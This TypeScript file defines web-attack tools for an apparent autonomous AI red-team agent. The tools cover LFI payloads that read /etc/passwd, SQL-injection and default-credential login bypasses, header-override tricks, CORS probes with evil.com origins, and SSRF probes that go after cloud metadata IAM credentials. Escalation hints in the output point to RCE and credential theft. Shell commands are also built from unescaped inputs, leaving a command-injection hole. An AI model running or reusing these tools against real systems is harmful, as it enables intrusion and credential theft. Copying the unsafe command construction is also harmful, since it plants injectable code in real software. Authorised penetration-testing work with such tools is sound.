/**
 * Web Application Attack Tools
 *
 * Covers the OWASP Top 10 categories missing from the original toolset:
 *   - LFI/Path Traversal
 *   - XSS (via dalfox)
 *   - Authentication bypass
 *   - CORS misconfiguration
 *   - SSRF
 *   - JWT analysis
 *   - Security headers audit
 */

import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { kesExec } from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'
import { buildTargetUrl } from '../lib/port-protocol.js'
import { resolveCredentials } from '../lib/cred-resolver.js'

const logger = createLogger('red_team_agent')

// ─────────────────────────────────────────────────────────────────────────────
// LFI / Path Traversal Testing
// ─────────────────────────────────────────────────────────────────────────────

export const lfiTestTool = new FunctionTool({
  name: 'lfi_test',
  description: `Test a URL parameter for Local File Inclusion (LFI) and path traversal vulnerabilities.
Tries multiple bypass techniques including encoding, null bytes, and PHP filter wrappers.

Use this when:
  - gobuster finds pages with ?file=, ?page=, ?path=, ?include= parameters
  - nikto reports directory traversal
  - The target runs PHP (php://filter wrapper works)

A confirmed LFI can be escalated to RCE via log poisoning or PHP filter chains.`,
  parameters: z.object({
    target: z.string().describe('Target host IP or hostname'),
    port: z.number().describe('Target port'),
    nmapTags: z.array(z.string()).optional(),
    path: z.string().describe('URL path containing the vulnerable parameter, e.g. "/index.php"'),
    parameter: z.string().describe('Query parameter to test, e.g. "page" or "file"'),
    method: z.enum(['GET', 'POST']).optional().describe('HTTP method (default: GET)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, path, parameter, method = 'GET', campaignId }) => {
    const start = Date.now()
    const baseUrl = buildTargetUrl(target, port, nmapTags ?? [])
    const curlBase = `curl -s --max-time 8 -k`

    // LFI payloads — ordered from simple to obfuscated
    const payloads = [
      // Basic traversal
      '../../../etc/passwd',
      '../../../../etc/passwd',
      '../../../../../etc/passwd',
      '../../../../../../etc/passwd',
      // Double-encoded
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      // Null byte (older PHP)
      '../../../etc/passwd%00',
      // PHP filter (extract file contents even without direct display)
      'php://filter/convert.base64-encode/resource=/etc/passwd',
      'php://filter/read=string.rot13/resource=/etc/passwd',
      // Windows targets
      '..\\..\\..\\windows\\win.ini',
      '../../../../windows/win.ini',
      // Proc
      '/proc/self/environ',
      '/proc/version',
    ]

    const vulnerable: Array<{ payload: string; evidence: string }> = []

    for (const payload of payloads) {
      let cmd: string
      if (method === 'GET') {
        cmd = `${curlBase} "${baseUrl}${path}?${parameter}=${encodeURIComponent(payload)}"`
      } else {
        cmd = `${curlBase} -X POST -d "${parameter}=${encodeURIComponent(payload)}" "${baseUrl}${path}"`
      }

      const result = await kesExec(cmd, 12)
      const output = result.stdout

      // Detection signatures
      const isVulnerable =
        output.includes('root:x:0:0') ||           // /etc/passwd
        output.includes('[extensions]') ||           // win.ini
        output.includes('DOCUMENT_ROOT') ||          // /proc/self/environ
        output.includes('Linux version') ||          // /proc/version
        // PHP filter: base64 output starts with 'cm9v' (base64 of 'roo')
        (payload.includes('base64') && /^[A-Za-z0-9+/]{20,}={0,2}$/.test(output.trim()))

      if (isVulnerable) {
        vulnerable.push({
          payload,
          evidence: output.slice(0, 500),
        })
        // Stop after first confirmed — we have proof
        if (vulnerable.length >= 2) break
      }
    }

    await logger.audit('lfi_test', { baseUrl, path, parameter }, { vulnerable: vulnerable.length }, Date.now() - start, campaignId)

    return {
      url: `${baseUrl}${path}`,
      parameter,
      vulnerable: vulnerable.length > 0,
      findings: vulnerable,
      hint: vulnerable.length > 0
        ? 'LFI confirmed. Escalation paths: log poisoning (/var/log/apache2/access.log), PHP session files, /proc/self/fd/, phpinfo() disclosure.'
        : 'No LFI detected with standard payloads. Try with different parameters found by gobuster.',
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// XSS Testing (dalfox)
// ─────────────────────────────────────────────────────────────────────────────

export const xssScanTool = new FunctionTool({
  name: 'xss_scan',
  description: `Scan a URL for Cross-Site Scripting (XSS) vulnerabilities using dalfox.
Tests reflected, DOM-based, and blind XSS. Dalfox discovers parameters automatically.

Use on:
  - URLs with query parameters (search, comment, redirect)
  - Form endpoints (POST)
  - Any user-input-reflecting endpoint found by gobuster

Severity mapping: Stored XSS = High, Reflected XSS = Medium, DOM XSS = Medium`,
  parameters: z.object({
    url: z.string().describe('Full target URL to test, including any known parameters'),
    method: z.enum(['GET', 'POST']).optional().describe('HTTP method (default: GET)'),
    postData: z.string().optional().describe('POST body data, e.g. "username=test&password=x"'),
    extraFlags: z.string().optional().describe('Additional dalfox flags'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ url, method = 'GET', postData, extraFlags, campaignId }) => {
    const start = Date.now()

    let command = `dalfox url "${url}" --silence --no-color --format json`

    if (method === 'POST' && postData) {
      command += ` -X POST -d "${postData}"`
    }
    // Skip TLS cert verification for lab environments
    if (url.startsWith('https://')) command += ' --ignore-return-500 --timeout 10'

    if (extraFlags) command += ` ${extraFlags}`

    const result = await kesExec(command, 120)

    // Parse dalfox JSON output
    const findings: Array<{ type: string; param: string; payload: string; evidence: string }> = []
    for (const line of result.stdout.split('\n')) {
      const trimmed = line.trim()
      if (!trimmed.startsWith('{')) continue
      try {
        const parsed = JSON.parse(trimmed)
        if (parsed.type === 'VULN' || parsed.poc) {
          findings.push({
            type: parsed.type ?? 'XSS',
            param: parsed.param ?? 'unknown',
            payload: parsed.payload ?? parsed.poc ?? '',
            evidence: parsed.data ?? trimmed,
          })
        }
      } catch {
        // Skip lines that aren't valid JSON
      }
    }

    // Fallback: grep for dalfox's text format if JSON output is empty
    if (!findings.length && result.stdout.includes('[VULN]')) {
      for (const line of result.stdout.split('\n')) {
        if (line.includes('[VULN]') || line.includes('[POC]')) {
          findings.push({ type: 'XSS', param: '?', payload: line, evidence: line })
        }
      }
    }

    await logger.audit('xss_scan', { url }, { findings: findings.length }, Date.now() - start, campaignId)

    return {
      url,
      vulnerable: findings.length > 0,
      findings,
      rawOutput: result.stdout.slice(0, 3000),
      error: result.returncode !== 0 && !findings.length ? result.stderr : undefined,
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// Authentication Bypass Testing
// ─────────────────────────────────────────────────────────────────────────────

export const authTestTool = new FunctionTool({
  name: 'auth_test',
  description: `Test a login endpoint for authentication bypass vulnerabilities.
Tests: SQL injection in login, default credentials, PHP type juggling,
HTTP header override, and JWT null algorithm.

Use BEFORE trying brute-force — these bypasses are faster and stealthier.`,
  parameters: z.object({
    target: z.string().describe('Target host IP or hostname'),
    port: z.number().describe('Target port'),
    nmapTags: z.array(z.string()).optional(),
    loginPath: z.string().describe('Path to the login endpoint, e.g. "/login" or "/admin/index.php"'),
    usernameField: z.string().optional().describe('Username form field name (default: "username")'),
    passwordField: z.string().optional().describe('Password form field name (default: "password")'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, loginPath, usernameField = 'username', passwordField = 'password', campaignId }) => {
    const start = Date.now()
    const baseUrl = buildTargetUrl(target, port, nmapTags ?? [])
    const loginUrl = `${baseUrl}${loginPath}`
    const curlBase = `curl -s --max-time 8 -k -c /tmp/auth_test_cookies.txt`

    const results: Array<{ test: string; result: 'bypass' | 'failed' | 'error'; evidence?: string }> = []

    // Helper: check if response indicates successful login
    const isLoggedIn = (resp: string) =>
      !resp.toLowerCase().includes('invalid') &&
      !resp.toLowerCase().includes('incorrect') &&
      !resp.toLowerCase().includes('wrong') &&
      !resp.toLowerCase().includes('error') &&
      (resp.includes('dashboard') || resp.includes('logout') || resp.includes('welcome') ||
       resp.includes('admin') || resp.includes('profile') || resp.length > 2000)

    // Test 1: Default credentials
    const defaultCreds = [
      ['admin', 'admin'],
      ['admin', 'password'],
      ['admin', 'admin123'],
      ['admin', ''],
      ['root', 'root'],
      ['administrator', 'administrator'],
      ['test', 'test'],
      ['guest', 'guest'],
    ]

    const credList: Array<[string, string]> = [...defaultCreds] as Array<[string, string]>
    if (campaignId) {
      const vaulted = await resolveCredentials(campaignId, { targetHost: target, credType: 'http_basic' })
      for (const c of vaulted) credList.unshift([c.username, c.secret])
    }

    for (const [user, pass] of credList) {
      const cmd = `${curlBase} -X POST -d "${usernameField}=${user}&${passwordField}=${pass}" -L "${loginUrl}"`
      const result = await kesExec(cmd, 12)
      if (isLoggedIn(result.stdout)) {
        results.push({
          test: `creds:${user}:${pass}`,
          result: 'bypass',
          evidence: result.stdout.slice(0, 300),
        })
        break // Found working creds, no need to continue
      }
    }

    // Test 2: SQL injection bypass
    const sqliPayloads = [
      [`' OR '1'='1`, 'anything'],
      [`' OR 1=1--`, 'x'],
      [`admin'--`, 'x'],
      [`' OR 'x'='x`, 'x'],
      [`1' OR '1'='1'/*`, 'x'],
    ]

    for (const [user, pass] of sqliPayloads) {
      const cmd = `${curlBase} -X POST --data-urlencode "${usernameField}=${user}" --data-urlencode "${passwordField}=${pass}" -L "${loginUrl}"`
      const result = await kesExec(cmd, 12)
      if (isLoggedIn(result.stdout)) {
        results.push({
          test: 'sql_injection_bypass',
          result: 'bypass',
          evidence: `Payload: ${user} | Response: ${result.stdout.slice(0, 200)}`,
        })
        break
      }
    }

    // Test 3: PHP type juggling (loose comparison == vs ===)
    const juggleCmd = `${curlBase} -X POST -d "${usernameField}=admin&${passwordField}[]=" -L "${loginUrl}"`
    const juggleResult = await kesExec(juggleCmd, 12)
    if (isLoggedIn(juggleResult.stdout)) {
      results.push({
        test: 'php_type_juggling',
        result: 'bypass',
        evidence: juggleResult.stdout.slice(0, 200),
      })
    }

    // Test 4: HTTP header overrides (may bypass IP-based restriction)
    const headerTests = [
      ['X-Original-URL', '/admin'],
      ['X-Rewrite-URL', '/admin'],
      ['X-Forwarded-For', '127.0.0.1'],
      ['X-Remote-IP', '127.0.0.1'],
      ['X-Client-IP', '127.0.0.1'],
    ]

    for (const [header, value] of headerTests) {
      const cmd = `curl -s --max-time 8 -k -H "${header}: ${value}" "${baseUrl}/admin"`
      const result = await kesExec(cmd, 12)
      if (result.returncode === 0 && result.stdout.length > 100 && !result.stdout.includes('403')) {
        results.push({
          test: `header_override:${header}`,
          result: 'bypass',
          evidence: result.stdout.slice(0, 200),
        })
      }
    }

    await logger.audit('auth_test', { loginUrl }, { bypasses: results.filter(r => r.result === 'bypass').length }, Date.now() - start, campaignId)

    const bypasses = results.filter(r => r.result === 'bypass')
    return {
      loginUrl,
      bypassFound: bypasses.length > 0,
      bypasses,
      allResults: results,
      hint: bypasses.length === 0
        ? 'No bypass found. Consider brute-force with hydra if other attack vectors fail.'
        : 'Authentication bypass confirmed. Run gobuster to enumerate authenticated areas.',
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// CORS Misconfiguration Testing
// ─────────────────────────────────────────────────────────────────────────────

export const corsScanTool = new FunctionTool({
  name: 'cors_test',
  description: `Test for Cross-Origin Resource Sharing (CORS) misconfigurations.
CORS misconfigurations allow malicious sites to make authenticated requests on behalf of users.

Critical if: Access-Control-Allow-Credentials: true AND Access-Control-Allow-Origin reflects arbitrary origins.`,
  parameters: z.object({
    target: z.string().describe('Target host IP or hostname'),
    port: z.number().describe('Target port'),
    nmapTags: z.array(z.string()).optional(),
    paths: z.array(z.string()).optional().describe('API/endpoint paths to test (default: ["/api/user", "/api/v1/user", "/api/me", "/profile"])'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, paths, campaignId }) => {
    const start = Date.now()
    const baseUrl = buildTargetUrl(target, port, nmapTags ?? [])
    const testPaths = paths ?? ['/api/user', '/api/v1/user', '/api/me', '/profile', '/api/profile', '/user/me']

    const origins = [
      'https://evil.com',
      'null',
      `https://${target}.evil.com`,
      'https://evil.com.target.local',
      'http://localhost',
    ]

    const findings: Array<{ path: string; origin: string; allowedOrigin: string; allowCredentials: boolean; severity: string }> = []

    for (const path of testPaths) {
      const url = `${baseUrl}${path}`

      for (const origin of origins) {
        const cmd = `curl -s -I --max-time 8 -k -H "Origin: ${origin}" "${url}"`
        const result = await kesExec(cmd, 12)
        const headers = result.stdout.toLowerCase()

        const allowedOrigin = (result.stdout.match(/access-control-allow-origin:\s*(.+)/i)?.[1] ?? '').trim()
        const allowCredentials = headers.includes('access-control-allow-credentials: true')

        if (!allowedOrigin) continue

        const reflected = allowedOrigin === origin || allowedOrigin === '*'
        if (!reflected) continue

        const isCritical = allowCredentials && allowedOrigin !== '*'
        const isHigh = allowCredentials && allowedOrigin === '*'
        const isMedium = !allowCredentials && reflected

        if (isCritical || isHigh || isMedium) {
          findings.push({
            path,
            origin,
            allowedOrigin,
            allowCredentials,
            severity: isCritical ? 'critical' : isHigh ? 'high' : 'medium',
          })
        }
      }
    }

    await logger.audit('cors_test', { baseUrl }, { findings: findings.length }, Date.now() - start, campaignId)

    return {
      baseUrl,
      vulnerable: findings.length > 0,
      findings,
      hint: findings.some(f => f.severity === 'critical')
        ? 'CRITICAL: CORS misconfiguration allows credential theft. Attacker can make authenticated API calls from any origin.'
        : findings.length > 0
        ? 'CORS misconfiguration found. Impact depends on whether sensitive data is exposed by the affected endpoint.'
        : 'No CORS misconfiguration detected.',
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// SSRF Testing
// ─────────────────────────────────────────────────────────────────────────────

export const ssrfTestTool = new FunctionTool({
  name: 'ssrf_test',
  description: `Test a URL parameter for Server-Side Request Forgery (SSRF) vulnerabilities.
Probes cloud metadata endpoints (AWS, Azure, GCP) and internal loopback.

SSRF can lead to: cloud credential theft, internal network enumeration, auth bypass.
Use when: parameters accept URLs (url=, redirect=, next=, link=, fetch=, proxy=)`,
  parameters: z.object({
    target: z.string().describe('Target host IP or hostname'),
    port: z.number().describe('Target port'),
    nmapTags: z.array(z.string()).optional(),
    path: z.string().describe('URL path with the vulnerable parameter, e.g. "/fetch"'),
    parameter: z.string().describe('Parameter that accepts a URL, e.g. "url" or "redirect"'),
    method: z.enum(['GET', 'POST']).optional().describe('HTTP method (default: GET)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, path, parameter, method = 'GET', campaignId }) => {
    const start = Date.now()
    const baseUrl = buildTargetUrl(target, port, nmapTags ?? [])

    // SSRF probe targets — internal/metadata endpoints
    const probeTargets = [
      // AWS EC2 metadata (IMDSv1 — no auth required)
      { url: 'http://169.254.169.254/latest/meta-data/', signature: 'ami-id', name: 'AWS IMDSv1 metadata' },
      { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', signature: 'role', name: 'AWS IAM credentials listing' },
      // Azure IMDS
      { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', signature: 'subscriptionId', name: 'Azure IMDS' },
      // GCP metadata
      { url: 'http://metadata.google.internal/computeMetadata/v1/', signature: 'instance', name: 'GCP metadata' },
      // Loopback — may reach internal admin panels
      { url: 'http://127.0.0.1/', signature: '', name: 'Loopback (127.0.0.1)' },
      { url: 'http://localhost/', signature: '', name: 'Loopback (localhost)' },
      // Internal common services
      { url: 'http://127.0.0.1:8080/', signature: '', name: 'Internal :8080' },
      { url: 'http://127.0.0.1:8443/', signature: '', name: 'Internal :8443' },
    ]

    const findings: Array<{ probe: string; url: string; evidence: string; severity: string }> = []

    for (const probe of probeTargets) {
      let cmd: string
      const encodedUrl = encodeURIComponent(probe.url)

      if (method === 'GET') {
        cmd = `curl -s --max-time 6 -k "${baseUrl}${path}?${parameter}=${encodedUrl}"`
      } else {
        cmd = `curl -s --max-time 6 -k -X POST -d "${parameter}=${encodedUrl}" "${baseUrl}${path}"`
      }

      const result = await kesExec(cmd, 10)
      const output = result.stdout

      const hitSignature = probe.signature && output.toLowerCase().includes(probe.signature.toLowerCase())
      const hasContent = output.length > 50 && result.returncode === 0

      // For metadata endpoints: signature match = confirmed SSRF
      // For loopback: any non-empty response = potential SSRF
      if (hitSignature || (probe.url.includes('127.0.0.1') && hasContent)) {
        const isCloudMeta = probe.name.includes('AWS') || probe.name.includes('Azure') || probe.name.includes('GCP')
        findings.push({
          probe: probe.name,
          url: probe.url,
          evidence: output.slice(0, 500),
          severity: isCloudMeta ? 'critical' : 'high',
        })
      }
    }

    await logger.audit('ssrf_test', { baseUrl, path, parameter }, { findings: findings.length }, Date.now() - start, campaignId)

    return {
      testUrl: `${baseUrl}${path}`,
      parameter,
      vulnerable: findings.length > 0,
      findings,
      hint: findings.length > 0
        ? 'SSRF confirmed. If cloud metadata is accessible, attempt to retrieve IAM credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>'
        : 'No SSRF detected with cloud metadata probes. Try with different URL parameters if any exist.',
    }
  },
})
